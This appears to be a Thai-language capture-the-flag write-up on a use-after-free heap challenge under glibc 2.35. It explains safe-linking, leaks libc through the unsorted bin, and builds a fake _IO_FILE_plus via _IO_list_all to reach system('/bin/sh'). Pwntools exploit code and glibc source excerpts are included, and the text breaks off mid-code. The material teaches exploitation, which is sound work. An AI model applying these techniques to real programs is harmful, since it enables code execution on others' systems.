# :electric_plug: define DL_CALL_FCT(fctp, args) \

---

`edit_note()` และ `view_note()` เช็ค `notes` ที่ `v1` ว่ามี Pointer ของ chunk มั้ย
ซึ่งมันไม่เคยถูกเคลียออกเลยสักครั้ง
`edit` ก็เขียนค่าลงไปใน chunk และ `view` ที่จะส่งค่าใน chunk ออกมาที่ Output

## Proving & Preparation

จากข้อมูลที่เรามีตอนนี้ก็ประมาณนี้ครับ เรามาเขียน Exploit Code กันเลยไหมครับ?

```
from pwn import *

context.log_level = "debug"
elf = ELF("./vuln")
context.arch='amd64'
r = gdb.debug("./vuln", gdbscript="")

def create():
r.recvuntil(b"> ")
r.sendline(b"1")
def delete(num):
r.recvuntil(b"> ")
r.sendline(b"2")
r.recvuntil(b"Index: ")
r.sendline(str(num).encode())
def edit(num, data):
r.recvuntil(b"> ")
r.sendline(b"3")
r.recvuntil(b"Index: ")
r.sendline(str(num).encode())
r.recvuntil(b"Data: ")
r.sendline(data)
def view(num):
r.recvuntil(b"> ")
r.sendline(b"4")
r.recvuntil(b"Index: ")
r.sendline(str(num).encode())
r.recvuntil(b"Note content:")
return r.read(0xF0, timeout=0.5)

create()
edit(0, "Hello World!")
delete(0)
print(view(0))

r.interactive()

```

ทำงานได้ตามปกติครับ!

ลองสังเกต `AAAAAAAAAAAAAAAAA` ที่ส่งกลับมาหลังจาก chunk ถูกลบไปแล้ว และ Data ด้านหน้า 16 byte ก็ confirm ว่ามี Use After Free ครับ ^^

กด CTRL + C แล้วก็รันคำสั่งใน gdb vis ครับ

```
pwndbg> vis
```

8 byte แรกที่เราเห็นคือ [Safe-Linking Mechanism](https://research.checkpoint.com/2020/safe-linking-eliminating-a-20-year-old-malloc-exploit-primitive/) ครับ มันมีไว้เพื่อ Encode Tcache Pointer ตัวถัดๆไปที่จะถูกใช้งานใน `malloc`

>

แต่ผมขอเรียกว่า Mangling แทน Encode นะครับ เพราะมันจะตรงกว่า

เรามาลองดูการทำงานกันหน่อยไหมครับ?

```
create()
create()
delete(0)
delete(1)
```

เปลี่ยนโค้ดของเรามาเป็น `malloc` สองรอบ และ `free` ทั้งคู่
หลังจากนั้นก็ไปดู `vis` ใน gdb ครับ

จะเห็นว่า ที่ `c310` เป็น Base Address ของ heap และ `c410` เป็น Pointer ที่ถูก Mangled ไว้

```
#define PAGE_SHIFT 12
#define PROTECT_PTR(pos, ptr, type) \
((type)((((size_t)pos) >> PAGE_SHIFT) ^ ((size_t)ptr)))
#define REVEAL_PTR(pos, ptr, type) \
PROTECT_PTR(pos, ptr, type)

// encoded = (heap >> 12) ^ where_to_write
```

วิธีการ DeMangle จะใช้ `REVEAL_PTR()` ซึ่งมันก็คือการ Mangle Pointer อีกรอบนึง
เพราะฉะนั้นแล้ว เราก็แค่ทำซ้ำในสิ่งที่มันทำครับ

เรามาลองคำนวน Mangled Pointer ของ `c410`กัน
โดยจะต้องให้ `heap` เป็น Address ของ Heap ที่ไหนก็ได้ (ต้องอยู่ใน Heap เดียวกัน)
และ `where_to_write` เป็น Address ที่ต้องการจะให้ Allocate เป็นตัวต่อไป

*p/x (0x564dd1c8c410>>12)^0x564dd1c8c310*

เห็นไหมครับว่ามันคือค่าเดียวกันกับที่อยู่ใน `c410` เลย
แสดงว่าถ้าเราสามารถคำนวน Safe-Linking ได้ เราก็จะเปลี่ยนตำแหน่งของ Heap ไปที่ไหนก็ได้ และ ได้ Arbitrary Write หนึ่งครั้งครับ

## แต่ก่อนอื่น !?

เนื่องจากว่าโจทย์ให้ `libc.so.6` และ `ld-linux-x86–64.so.2` มา
หมายความว่า Environment ของเรา กับ บน Server น่าจะไม่เหมือนกันแน่ๆ

เราควรเปลี่ยนให้ `./vuln` ของเราไปใช้ `libc` version ที่ถูกต้องจะดีกว่าครับ

ในครั้งนี้ผมจะใช้ [pwninit](https://github.com/io12/pwninit) เพราะว่าลองแล้วติดใจมากๆ มันจะ Download Version Libc/LD ที่ตรงแล้ว Patch Binary ให้เองเลย

>

ลบ `ld-linux-x86–64.so.2`ตัวเก่าก่อนนะครับ ไม่แน่ใจว่าเวอร์ชั่นผิดหรืออะไร แต่ผมลองเอามา link แล้วมันใช้ไม่ได้

```
r = gdb.debug("./vuln_patched", gdbscript="")
```

## Exploit Step 1 : What do we have?

เรามาทบทวนกันดีกว่า ตอนนี้เรามีอะไรบ้าง?

- User After Free (UAF) read/write

- Arbitrary Address Write (AAW) 1 ครั้ง

- Heap Base จาก UAF ของ Safe Linking ตัวแรก

โดยปกติ หลังจากได้ `AAW` แล้วเราก็จะเขียนไปที่ `__malloc_hook`
ซึ่งใน Libc Version ≥ 2.35 ไม่ได้ถูกใช้งานแล้ว ก็เลยใช้ไม่ได้

วิธีที่ผมคิดได้ก็มีอยู่แค่วิธีเดียว คือ Leak Libc Address จาก UAF ให้ได้ แล้วจะไปเขียนที่ไหนบน Libc ก็ค่อยว่ากัน 5555 😂

ซึ่ง Bins ต่างๆของเราใน glibc จะมีอยู่ 3 ตัวที่สามารถ Leak Libc Address ได้ คือ
small, large, unsorted เพราะเป็น Doubly-Linked List ครับ

🤔 แต่ว่าเราจะต้องผ่าน Tcache ไปให้ได้ก่อน…

- ใน Libc Version 2.43 (ล่าสุด) Bin ที่ `0x100` (size ที่ malloc จองมา) จะไปอยู่คือ Small Bin

- แต่ Libc Version 2.35 (โจทย์) มันจะไปอยู่ที่ Unsorted Bin แทน

>

เรื่องนี้ผมเดาว่าเพราะ Lazy Consolidation
รุ่นใหม่กว่ามีการเรียกใช้ `malloc_consolidate` ถี่กว่า ทำให้ Freed Chunk หลุดไปอยู่ใน Small bin เร็วกว่ารุ่นเก่า

Tcache Bin มีทั้งหมด 7 ช่องสำหรับแต่ละขนาด

เพราะฉะนั้น เราต้อง Allocate ให้ Tcache เต็มก่อน แล้วมันจะไปโผล่ที่ Unsorted Bin ครับ

```
create() // 0
create()
create()
create()
create()
create()
create()
create() // 7
create() // 8
delete(0)
delete(1)
delete(2)
delete(3)
delete(4)
delete(5)
delete(6)
delete(7) // go to unsorted bin
```

เหตุผลที่ผม `free` 7 ตัว ให้พอดีกับ Tcache และ +1 เพื่อไป Unsorted Bin (รวม 8 ตัว) แต่ `malloc` มา 9 ตัว เพราะว่าใช้ตัวสุดท้ายมากั้น `Top Chunk` ไม่ให้ Consolidate กับ ตัวที่ 8

และเห็นนั่นไหมๆ! ที่`0x557f118b89a0` เป็น Address ของ Libc! ซึ่งโดยปกติแล้วมันจะชี้ไปที่ Main Arena

เราสามารถใช้ `view()` เพื่ออ่านมันออกมาได้ครับ

```
print(hex(int((u64(view(7)[0:8]))>>8)))
```

เท่านี้ เราก็สามารถคำนวน Libc Base Address ได้แล้ว!

```
libc = ELF("libc.so.6")
libcaddr = int((u64(view(7)[0:8]))>>8)-96- libc.sym.main_arena
libc.address = libcaddr

info("libc : "+hex(libcaddr))
```

*pwndbg> vmmap*

## Exploit Step 2: What is next?

ตอนนี้เรามี Arbitrary Address Write (AAW)เหลืออยู่ 1 ครั้ง พร้อมกับ Address ของ Libc

AAW ที่มีจะ Zeroize(ทำให้เป็น 0) ข้อมูลเป็นระยะ 0xf0 byte ก่อนที่จะสามารถแก้ไขได้

ซึ่งตรงนี้เราควบคุมอะไรไม่ค่อยได้จริงๆ

หลังจากนั่งหาข้อมูลไปซักพัก ผมก็เจอกับ [github](https://github.com/nobodyisnobody/docs/tree/main/code.execution.on.last.libc/) อันนี้มา ซึ่งสอนเกี่ยวกับ Technique ทั้ง 6 ตัวที่สามารถ Arbitrary Code Execution ใน GLIBC Version มากกว่า 2.35 ได้

เรามาทดลองกันทีละอันเลยดีกว่า

### 1. Targetting libc GOT entries

ก่อนอื่นเราต้องเช็คว่า Libc เป็น Partial RELRO รึเปล่า (Flag และ rw- ในช่วง GOT)

แต่หลังจากลองเช็คดูดีๆแล้ว

เหมือนว่ามันจะเป็น Read Only (`r — `) เฉยๆ ทำอะไรไม่ได้ เราอาจจะต้องลองเช็ค Permission ตรงๆ

เป็น `r —` ครับ GOT ของ Libc ไม่สามารถถูกเขียนได้

เพราะฉะนั้น วิธีนี้กับ `setcontext32` ก็ใช้ไม่ได้ครับ

### 2. Targetting ld.so link_map structure

ท่านี้คล้ายๆ `ret2dlresolve` ผมเคยอ่านเจอตอน Research เรื่อง Heap เมื่อปีที่แล้ว [https://hackmd.io/@pepsipu/S15ivxPDt](https://hackmd.io/@pepsipu/S15ivxPDt)

โปรแกรมทุกโปรแกรมใน Linux หลังเรียกใช้ `exit()`จะไปเรียกใช้ `[__run_exit_handlers](https://elixir.bootlin.com/glibc/glibc-2.35/source/stdlib/exit.c#L38)` ที่ไปรัน Deconstructor ต่อ และ หนึ่งในนั้นคือ `[_dl_fini](https://elixir.bootlin.com/glibc/glibc-2.35/source/elf/dl-fini.c#L30)`

>

ใน Source code มันอาจจะดูไม่ชัดเจนเท่าไหรเพราะไม่ได้เรียกใช้ตรงๆ แต่ผ่านจาก `ef_cxa entry` แทน แต่หลักการก็เป็นประมาณนี้

แล้วก็จะเริ่มไล่ Iterate ตาม link map ครับ จนไปเรียกใช้ `((fini_t) array[i]) ();` ที่จะเรียกใช้ Arbitary Function แต่ควบคุม Parameter ไม่ได้

และ ถ้าเลื่อนลงไปอีกหน่อย จะมี `DL_CALL_DT_FINI()` ที่เป็น Macro สำหรับการรัน Arbitary Function เหมือนกัน

```
for (i = 0; i < nmaps; ++i){
struct link_map *l = maps[i];

if (l->l_init_called){
...
{
/* When debugging print a message first. */
if (__builtin_expect (GLRO(dl_debug_mask)
& DL_DEBUG_IMPCALLS, 0))
_dl_debug_printf ("\ncalling fini: %s [%lu]\n\n",
DSO_FILENAME (l->l_name),
ns);

/* First see whether an array is given. */
if (l->l_info[DT_FINI_ARRAY] != NULL)
{
ElfW(Addr) *array =
(ElfW(Addr) *) (l->l_addr
+ l->l_info[DT_FINI_ARRAY]->d_un.d_ptr);
unsigned int i = (l->l_info[DT_FINI_ARRAYSZ]->d_un.d_val
/ sizeof (ElfW(Addr)));
while (i-- > 0)
((fini_t) array[i]) ();
}

/* Next try the old-style destructor. */
if (ELF_INITFINI && l->l_info[DT_FINI] != NULL)
DL_CALL_DT_FINI
(l, l->l_addr + l->l_info[DT_FINI]->d_un.d_ptr);
}
...
```

ถ้าดูใน Libc Version ที่ใหม่กว่าเราจะเห็น Function `[dl_call_fini](https://elixir.bootlin.com/glibc/glibc-2.38/source/elf/dl-call_fini.c#L23)` ถูกเรียกใช้แทนส่วนตรงนี้ และ ดูง่ายกว่าด้วย แนะนำให้ดูเทียบไปด้วยจะง่ายกว่าครับ

```

#define DT_FINI 13
/* Next try the old-style destructor. */
ElfW(Dyn) *fini = map->l_info[DT_FINI]; // [13]
if (fini != NULL)
DL_CALL_DT_FINI (map, ((void *) map->l_addr + fini->d_un.d_ptr));
```

เห็นไหมว่ามันจะเรียกใช้ `map->l_info[13](map->l_addr + fini->d_un.d_ptr)` แบบนี้เลย โดยเราก็สามารถ Arbitrary Write ไปเขียนที่ `l_info[13]` ให้ชี้ไปที่ Heap ของเรา แล้ว ใส่ `Elfw(Dyn)` ปลอมเข้าไปก็จบ

แต่เราจำเป็นต้องมี Arbitrary Address Read (AAR) เพื่อหา `l_info` จาก `map` ก่อนนี่สิ เลยใช้ไม่ได้ 55555

## the FSOP way, targetting stdout

>

ท่านี้มีวิธีการไปหลากหลายมาก ไม่จำเป็นต้องทำตามผมก็ได้นะ *🙂↕*
รอบนี้เป็นครั้งแรกที่ผม Research เรื่อง `*FSOP*`และทำ Heap Exploit มาจบที่ท่านี้ แปลกใหม่มากๆ และ ตื่นเต้นมากๆ 5555
เพราะฉะนั้นจะพยายามอธิบายให้เข้าใจมากที่สุดนะครับ 🙏

`[_IO_FILE](https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/bits/types/struct_FILE.h#L49)` หรือ `[struct FILE](https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/bits/types/FILE.h#L7)` คือ struct ที่ใช้สำหรับ File Stream มีหน้าที่ระบุ read/write ptr, File Descriptor และ อื่นๆ

```
// libio/bits/types/struct_FILE.h#L49
struct _IO_FILE {
int _flags; // magic + flags
char *_IO_read_ptr;
char *_IO_read_end;
char *_IO_read_base;
char *_IO_write_base;
char *_IO_write_ptr;
char *_IO_write_end;
char *_IO_buf_base;
char *_IO_buf_end;
// ...
struct _IO_FILE *_chain; // linked list ไปหา FILE อื่น
// ...
};
```

และเราก็มี `[_IO_jump_t](https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/libioP.h#L293)` เป็นตัวจัดการ virtual function table ที่จะถูกเรียกใช้ตาม Function libc ต่างๆ

```
// libio/libioP.h#L293
struct _IO_jump_t {
void *__dummy;
void *__dummy2;
_IO_finish_t __finish; // [2]
_IO_overflow_t __overflow; // [3]
_IO_underflow_t __underflow; // [4]
_IO_underflow_t __uflow; // [5]
_IO_pbackfail_t __pbackfail; // [6]
_IO_xsputn_t __xsputn; // [7]
_IO_xsgetn_t __xsgetn; // [8]
_IO_seekoff_t __seekoff; // [9]
_IO_seekpos_t __seekpos; // [10]
_IO_setbuf_t __setbuf; // [11]
_IO_sync_t __sync; // [12]
_IO_doallocate_t __doallocate; // [13]
_IO_read_t __read; // [14]
_IO_write_t __write; // [15]
_IO_seek_t __seek; // [16]
_IO_close_t __close; // [17]
_IO_stat_t __stat; // [18]
_IO_showmanyc_t __showmanyc; // [19]
_IO_imbue_t __imbue; // [20]
};
```

เช่น `fclose()` จะไปเรียกใช้ `__finish`, `fwrite` ไปเรียกใช้ `__overflow` หรือ `fread` ไปเรียกใช้ `__underflow` เป็นต้น

สุดท้าย เราก็จะมี `[_IO_FILE_plus](https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/libioP.h#L324)` เป็นการร่วมร่างของทั้งสอง struct

```
// libio/libioP.h#L324
struct _IO_FILE_plus
{
FILE file;
const struct _IO_jump_t *vtable;
};
```

ทั้ง 3 ตัว `stdin`, `stdout`, `stderr` ใช้ `_IO_FILE_plus` เหมือนกันหมด โดยจะมีตัวหลักคือ `_IO_list_all` เป็น Global Linked List ครับ

`_IO_list_all` จะเก็บ Pointer ของ `stderr` ไว้

ลองสังเกตที่ `_chain` จะเห็นว่าชี้กลับไปที่ `stdout` ซึ่งถ้าทำไปเรื่องก็จะเป็นแบบนี้

```
_IO_list_all ->_IO_2_1_stderr_ -> _IO_2_1_stdout_ -> _IO_2_1_stdin_
```

หน้าตาของ Link List ก็คงจะประมาณนี้ครับ

สมัยก่อนเราก็จะ Overwrite ทับ Vtable Pointer ไป Memory ที่เราสามารถควบคุมได้ และ ทำ Fake Vtable เพื่อเรียกใช้ Arbitrary Function
ตัวอย่าง : [https://github.com/mahaloz/ctf-wiki-en/blob/master/docs/pwn/linux/io_file/fsop.md](https://github.com/mahaloz/ctf-wiki-en/blob/master/docs/pwn/linux/io_file/fsop.md)

แต่หลังจาก GLIBC 2.24 เป็นต้นมา มีสิ่งที่เรียกว่า [Vtable Validation](https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/libioP.h#L936)มาอุดเรียบร้อยครับ

```
IO_validate_vtable (const struct _IO_jump_t *vtable)
{
/* Fast path: The vtable pointer is within the __libc_IO_vtables
section. */
uintptr_t section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;
uintptr_t ptr = (uintptr_t) vtable;
uintptr_t offset = ptr - (uintptr_t) __start___libc_IO_vtables;
if (__glibc_unlikely (offset >= section_length))
/* The vtable pointer is not in the expected section. Use the
slow path, which will terminate the process if necessary. */
_IO_vtable_check ();
return vtable;
}
```

ขั้นตอนการเช็คมีแค่เช็คว่า `vtable` อยู่ระหว่าง `__start___libc_IO_vtables` ถึง `__stop___libc_IO_vtables` รึเปล่า? ซึ่งจากการเช็คตรงนี้ เราก็ทำให้เราหมดสิทธิ์เขียนทับ `vtables` Pointer ไปเป็น Arbitrary Memory แล้วครับ 5555

แต่เราสามารถใช้ AAW เขียนทับ `_IO_list_all` ให้ชี้ไปที่ Memory ที่เราสามารถควบคุมได้ (Arbitrary Memory) และเขียน `_IO_FILE_plus` ปลอมลงไป
โดยแก้ไข Address ของ vtable ให้มันขยับ offset นิดนึง เพื่อให้เราสามารถควบคุม Function Call ต่างๆที่จะเกิดขึ้นได้ และ ส่ง Parameter ที่ต้องการลงไป

ใน github ที่ลงไว้ไม่ได้มีการอธิบายอะไรเพิ่มเติม มีแค่บอกว่า `libc.sym[‘_IO_wfile_jumps’]-0x18` จะชี้ไปที่ offset 0 และ จบที่ Function `[_IO_wfile_underflow](https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/wfileops.c#L111)`

ซึ่งผมไป Research [อันนี้](https://bbs.kanxue.com/thread-273863-1.htm) และ [อันนี้](https://roderickchan.github.io/zh-cn/house-of-apple-%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84glibc%E4%B8%ADio%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95-3/) เพิ่มมาอีกนิดหน่อยมันก็ยังแปลกๆอยู่ดี ก็เลยลองไล่โค้ดเอง

```
// /libio/wfileops.c#L111 _IO_wfile_underflow

if (fp->_flags & _IO_EOF_SEEN) // ผ่าน #define _IO_EOF_SEEN 0x10

if (fp->_flags & _IO_NO_READS) // ผ่าน #define _IO_NO_READS 0x4

if (fp->_wide_data->_IO_read_ptr < fp->_wide_data->_IO_read_end)
return *fp->_wide_data->_IO_read_ptr;
// ผ่าน fp->_wide_data เป็น Null Memory

if (fp->_IO_read_ptr < fp->_IO_read_end) เข้า Branch นี้ เพราะ _IO_read_end เป็น system Address
__libio_codecvt_in(...)
```

อ้างอิงจาก Payload ใน Github ก็ไม่น่าจะมีเคสที่ไม่ผ่าน
ไล่ Branch ลงมาเรื่อยๆก็จะเจอกับ` __libio_codecvt_in(...)` ครับ

ไปกันต่อที่ [__libio_codecvt_in](https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/iofwide.c#L162)

```
# define DL_CALL_FCT(fctp, args) \
(_dl_mcount_wrapper_check ((void *) (fctp)), (*(fctp)) args)

struct __gconv_step *gs = codecvt->__cd_in.step;

__gconv_fct fct = gs->__fct;
#ifdef PTR_DEMANGLE
if (gs->__shlib_handle != NULL)
PTR_DEMANGLE (fct);
#endif

status = DL_CALL_FCT (fct, (gs, ...));
```

`gs` คือ `_IO_2_1_stdout_+ 0x20` ชี้ไปที่ `_IO_write_base`

`DL_CAL_FCT(fctp, args)` เป็นแค่ warper ของ `fctp(args)`; เฉยๆ

```
gs->__shlib_handle = *(gs + 0x00) = _IO_2_1_stdout_ + 0x20 = _IO_write_base = 0 (fake struct)
gs->__fct = *(gs + 0x28) = _IO_2_1_stdout_ + 0x20 + 0x28 = _IO_2_1_stdout_ + 0x48
_IO_2_1_stdout_ + 0x48 = _IO_save_base = gadget // (add rdi, 0x10 ; jmp rcx)

gs->__fct = gadget // (add rdi, 0x10 ; jmp rcx)

DL_CALL_FCT(fct,
( gs, // rdi
&codecvt->__cd_in.step_data, // rsi
&from_start_copy, // rdx
from_end, // rcx
...)
)
```

และ `from_end` คือ Parameter ตัวที่ 4 หรือ `rcx` ซึ่งถูกส่งต่อมาจาก Function Call อีกที ถ้าเราย้อนกลับขึ้นไป ก็จะเห็น `_IO_read_end` ที่ถูกส่งต่อลงมา ซึ่งเราแทนค่าให้เป็น `libc.sym[‘system’]` ไปแล้วนั่นเอง!

เพราะฉนั้นตอนนี้เราก็จะได้ `gadget(gs, ..., system_addr)` โดยที่เรียกใช้ `add rdi, 0x10` เพราะ `rdi -> stdout+0x20` คือ `_IO_write_base`
ถ้าบวกอีก 0x10 ก็จะเป็น `_IO_write_end` ที่เป็น `/bin/sh` เรา `jmp rcx` ที่เป็น `system()` ก็จะจบลงที่ `system("/bin/sh")`

## Exploit Step 3 : Wake up and Make it real !!!

เราคงต้องตื่นจากฝันหวาน Static Analysis เมื่อกี้ก่อน
เพราะว่าในความเป็นจริงแล้ว เรามี AAW ก็จริง แต่มันจะ `memset` ส่วน Memory นั้นให้กลายเป็น 0 ทันที

พอเราเริ่ม `malloc(0xF0)`

มันก็น่าจะ Allocate ได้จริงที่ `_IO_2_1_stdout_` แต่มันจะโดน Zeroize ด้วย `memset` แล้วก็ถูกใช้งานโดย `printf` ทำให้โปรแกรม Crash

ลองดูก็ได้นะ 555

```
def get_safe_linking(ptr, where): # P = (L >> 12) XOR mangled
return ptr >> 12 ^ where

hbase = u64(b'\0'+view(0)[1:8])*16
info("hbase : "+hex(hbase))

edit(6, p64(get_safe_linking(hbase, libc.sym['_IO_2_1_stdout_'])))
create()
create()
```

แล้วลองดูที่ `gdb` ครับ

*x/50i $rip-0x50*

เราเกิด Segmentation Fault (`sigsegv`)ที่ ตรงนี้ `rbp+0x88` ถูกย้ายเข้ามาใน `rdi`

*info reg*

จาก Register ก็จะเห็นว่า `rbp` ชี้ไปที่ `_IO_2_1_stdout_` และ `rdi` เป็น 0

*p _IO_2_1_stdout_*

ก็ศูนย์หมดตามที่คาดการไว้ เพราะว่า `memset` ทำให้เป็นแบบนี้ครับ

เราไม่สามารถยุ่งกับ `std` ตัวไหนได้เลย
ถ้าแก้ `stdout` ก็จะโดน `printf` เมื่อกี้
ถ้าแก้ `stdin` ก็จะโดน `read_int` รอบถัดไป
ถ้าแก้ `stderr` ก็จะโดน `puts` จาก `menu`

โดนหมดครับ 555 แต่เราก็ไม่จำเป็นจะต้องไปยุ่งกับ Pre-defined Struct เสมอไปก็ได้ครับ

*_IO_list_all chain*

ยังพอจำได้ไหมที่ผมพูดถึง `_IO_list_all` ก่อนหน้านี้
เราสามารถจอง Heap มา chunk นึง และ AAW pointer ของ `_IO_list_all` ไปตรงนั้นได้
แล้วเราก็แค่ใส่ `_IO_FILE_plus` ปลอมเข้าไปเพื่อ Trick glibc ครับ ^^

>

ลบส่วนที่เทสเมื่อกี้ออกด้วยนะครับ

```
create() # allocate 0, UAF 6, offset 8a0

arr = FileStructure(0)
arr.flags = 0xfbad208B
arr.vtable = p64(libc.sym['_IO_wfile_jumps']-0x18)

edit(5, p64(get_safe_linking(hbase, libc.sym['_IO_list_all'])))
edit(0, bytes(arr)) # 0x8a0 = _IO_FILE_PLUS

create() # allocate 1, UAF 5
create() # Trigger Overwrite _IO_list_all, allocate 2, UAF 4

edit(2, p64(hbase+0x8a0)) # _IO_list_all -> (struct _IO_FILE_PLUS*) 0x8a0
```

โดยที่ `hbase` คือ Heap base ที่ได้มาจาก chunk ตัวที่ 0
เป็นตัวเริ่มต้นของ Tcache เพราะมันคือ `HeapPTR >> 12`

`_IO_list_all` ถูกเขียนทับเรียบร้อย! แต่เราจะไปต่อยังไงดี มันจบได้แค่เขียนอะดิ

## Exploit Step 4 : Leaving Off The Land

เรื่องนี้เราอาจจะต้องเล่าย้อนกันยาว

กลับไปดูที่ [exit.c](https://elixir.bootlin.com/glibc/glibc-2.35/source/stdlib/exit.c#L38) ครับ!

`exit()` จะไปเรียกใช้ `__run_exit_handlers()`

```
# define RUN_HOOK(NAME, ARGS) \
do { \
void *const *ptr; \
for (ptr = (void *const *) symbol_set_first_element (NAME); \
! symbol_set_end_p (NAME, ptr); ++ptr) \
(*(__##NAME##_hook_function_t *) *ptr) ARGS; \
} while (0)

void __run_exit_handlers() {
...
if (run_list_atexit)
RUN_HOOK (__libc_atexit, ()); // ตรงนี้

_exit (status);
}
```

และจบลงที่ `RUN_HOOK(__libc_at_exit, ())`
`RUN_HOOK` เป็น Macro ที่เรียกใช้ Functions ทุกตัวที่ hook กับ Symbols อันนี้ไว้

เราก็ต้องไปไล่ดูว่ามีอะไรกันบ้าง 5555

*[https://elixir.bootlin.com/glibc/glibc-2.35/A/ident/text_set_element](https://elixir.bootlin.com/glibc/glibc-2.35/A/ident/text_set_element)*

`libio/` นี่น่าสนใจที่สุด มันจะมี `_IO` อะไรที่สามารถรองรับ ตัว `FSOP` ของเราได้ไหมนะ?

`[text_set_element](https://elixir.bootlin.com/glibc/glibc-2.35/C/ident/text_set_element)(__libc_atexit, [_IO_cleanup](https://elixir.bootlin.com/glibc/glibc-2.35/C/ident/_IO_cleanup));` เจอตัวนี้แล้วครับ `exit()` จะเรียกใช้ `_IO_cleanup` เราไปดูว่ามันทำงานยังไงกันดีกว่า

```
int
_IO_cleanup (void)
{
/* We do *not* want locking. Some threads might use streams but
that is their problem, we flush them underneath them. */
int result = _IO_flush_all_lockp (0);

/* We currently don't have a reliable mechanism for making sure that
C++ static destructors are executed in the correct order.
So it is possible that other static destructors might want to
write to cout - and they're supposed to be able to do so.

The following will make the standard streambufs be unbuffered,
which forces any output from late destructors to be written out. */
_IO_unbuffer_all ();

return result;
}
```

ไปเรียกใช้ `[_IO_flush_all_lockp](https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/genops.c#L685)()`

```
int
_IO_flush_all_lockp (int do_lock)
{
int result = 0;
FILE *fp;

#ifdef _IO_MTSAFE_IO
_IO_cleanup_region_start_noarg (flush_cleanup);
_IO_lock_lock (list_all_lock);
#endif

for (fp = (FILE *) _IO_list_all; fp != NULL; fp = fp->_chain)
{
run_fp = fp;
if (do_lock)
_IO_flockfile (fp);

if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)
|| (_IO_vtable_offset (fp) == 0
&& fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr
> fp->_wide_data->_IO_write_base))
)
&& _IO_OVERFLOW (fp, EOF) == EOF)
result = EOF;

if (do_lock)
_IO_funlockfile (fp);
run_fp = NULL;
}

#ifdef _IO_MTSAFE_IO
_IO_lock_unlock (list_all_lock);
_IO_cleanup_region_end (0);
#endif

return result
}
```

เห้ย! เห็นเหมือนกับที่ผมเห็นปะ มันมีการ Iterate `_IO_list_all` ทุก `_chain`
แล้วแยกช่วงที่เช็คเป็น 2 เงื่อนไขครับ

```
(((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)
|| (_IO_vtable_offset (fp) == 0
&& fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr
> fp->_wide_data->_IO_write_base))
)

และ

_IO_OVERFLOW (fp, EOF) == EOF)
```

`[_IO_OVERFLOW](https://elixir.bootlin.com/glibc/glibc-2.35/C/ident/_IO_OVERFLOW)` เป็น Macro ที่จะเรียกใช้ `[__overflow](https://elixir.bootlin.com/glibc/glibc-2.35/C/ident/__overflow)`ของ vtable

*disass _IO_flush_all_lockp*

ที่มี `rax` เป็น `fp` หรือ `_IO_FILE_plus` ที่เราใส่เข้าไปครับ
เรามา Setup File Struct ให้ตรงตาม Requirement กันเลยดีกว่า

```
arr = FileStructure(0)
arr.flags = 0xfbad208B
arr._IO_write_ptr = 1
arr._IO_write_base = 0
arr.vtable = p64(libc.sym['_IO_wfile_jumps']-0x18)
```

`fp->_mode <= 0` โดยปกติก็จะเป็น 0 อยู่แล้ว
`fp->_IO_write_ptr > fp->_IO_write_base` 1 > 0 แน่นอน

ส่วนด้านหลังไม่ต้องสนใจ เพราะว่าเป็น || (or) case

*break *_IO_flush_all_lockp+223*

ก่อนเรียกใช้ `exit()` ด้วยการใช้ option 5
ผมขอ Break ไปที่ `call [rax+0x18]` ก่อน เพื่อดูว่าทฤษฏีของเราจริงไหม

แล้วเรามาดู `RAX` กันดีกว่า

ค่าตรงกันนะครับ ทีนี้เราก็สามารถควบควมว่าจะให้มันไปตกที่ตรงไหนได้แล้วด้วยการบวก offset เข้าไป

ถ้าเราต้องการให้ไปตกที่ `_IO_wfile_underflow` และใช้ท่าที่ผมสอนทุกคนไป ก็จะต้องไป + `0x8`

เรามาลองทำตามกันไหมครับ? ว่า +8 ได้จริงไหม

หลังจากนี้ผมจะให้ทุกคนเป็นการบ้านสำหรับ `_IO_wfile_underflow` เพราะว่าผมมีอีกท่ามาสอนสำหรับ FSOP ด้วย

หนีครับ! ไม่อยู่แล้ว underflow ไป overflow ดีกว่า 555555

เหมือนกับตอนที่เรา Static Analysis `_IO_wfile_underflow` เลยครับ เราแค่ต้องไล่ไปเรื่อยๆจนกว่าจะเจอจุดที่สามารถเกิด Arbitrary Function ได้

`_IO_wfile_overflow` มีการใช้ `_wide_data` เป็นจำนวนมาก ทำให้เราไม่จำเป็นต้องคำนวน offset และ gadget อะไรเยอะแยะมากมายเหมือนตอน `underflow`

เรามาเริ่มกันเลยดีกว่า

```
if (f->_flags & _IO_NO_WRITES) // _IO_NO_WRITES = 0x0008
if (f->_flags & _IO_CURRENTLY_PUTTING) == 0) // _IO_CURRENTLY_PUTTING = 0x0800
if (f->_wide_data->_IO_write_base == 0) // เป็นอยู่แล้ว ถ้า Point ถูก
_IO_wdoallocbuf()
```

`f->_flags` แทบจะเป็นอิสระเลยครับ ไม่ต้องคิดมาก ใส่อะไรก็ใส่ๆไปเถอะ 5555
`f->_wide_data->_IO_write_base` คือสิ่งที่เราต้องมี Memory มาให้ Point

จำได้ไหมครับ เรายังเหลือตัวที่ใช้กั้น Top chunk (8) ที่ยังไม่ได้ใช้
ถ้าไม่อยาก Allocate เพิ่ม และ จัด Index ใหม่ ก็ใช้อันนี้ไปเถอะ 5555

Index เราควรนั่งนับมือ เพราะใช้ `FileStructure()` ของ Pwntools แล้วมันจะไม่ตรงครับ 😂

และก็จะเรียกใช้งาน `[_IO_wdoallocbuf()](https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/wgenops.c#L364)` ต่อครับ

```
// libio/wgenops.c#L364

#define _IO_WDOALLOCATE(FP) WJUMP0 (__doallocate, FP)

void _IO_wdoallocbuf (FILE *fp) {
if (fp->_wide_data->_IO_buf_base)
return;
if (!(fp->_flags & _IO_UNBUFFERED))
if ((wint_t)_IO_WDOALLOCATE (fp) != WEOF)
return;
_IO_wsetb (fp, fp->_wide_data->_shortbuf,
